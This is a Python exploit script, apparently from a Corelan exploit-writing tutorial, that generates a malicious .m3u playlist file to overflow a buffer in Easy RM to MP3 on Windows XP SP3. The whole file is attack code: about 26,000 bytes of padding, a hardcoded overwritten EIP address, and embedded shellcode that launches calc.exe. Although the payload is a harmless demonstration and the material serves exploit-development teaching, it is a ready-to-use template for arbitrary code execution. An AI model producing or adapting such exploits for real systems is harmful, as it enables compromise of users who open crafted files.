# Corelan exploit writing tutorial 1
# Easy RM to MP3 exploit for Windows XP SP3
import struct

fh = open("launch_calc_win-exec-calc-shellcode.m3u", "w")
junk = ''
for i in range(0,26072):
  junk += b'\x41'


# struct.pack
# < indicates little endian
# I indicates integer value input
eip = struct.pack('<I', 0x01d2f23a)

preshellcode = 'XXXX'

# Actual working shellcode from 
# https://code.google.com/p/win-exec-calc-shellcode/downloads/detail?name=win-exec-calc-shellcode-302.zip 

buf = ("\x31\xc9\x49\x31\xd2\xe3\x47\x52\x68\x63\x61\x6c\x63\x89\xe6\x52\x56\x64\x8b\x72\x30\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30" + \
"\x8b\x7e\x18\x8b\x5f\x3c\x8b\x5c\x1f\x78\x8b\x74\x1f\x20\x01\xfe\x8b\x4c\x1f\x24\x01\xf9\x0f\xb7\x2c\x51\x42\xad\x81\x3c" + \
"\x07\x57\x69\x6e\x45\x75\xf1\x8b\x74\x1f\x1c\x01\xfe\x03\x3c\xae\xff\xd7\x6a\x60\x5a\x68\x63\x61\x6c\x63\x54\x59\x48\x83" + \
"\xec\x28\x65\x48\x8b\x32\x48\x8b\x76\x18\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57\x3c\x8b\x5c\x17\x28" + \
"\x8b\x74\x1f\x20\x48\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x8d\x52\x02\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xef\x8b\x74" + \
"\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01\xf7\x99\xff\xd7")

fh.write(junk+eip+preshellcode+buf)
fh.close()
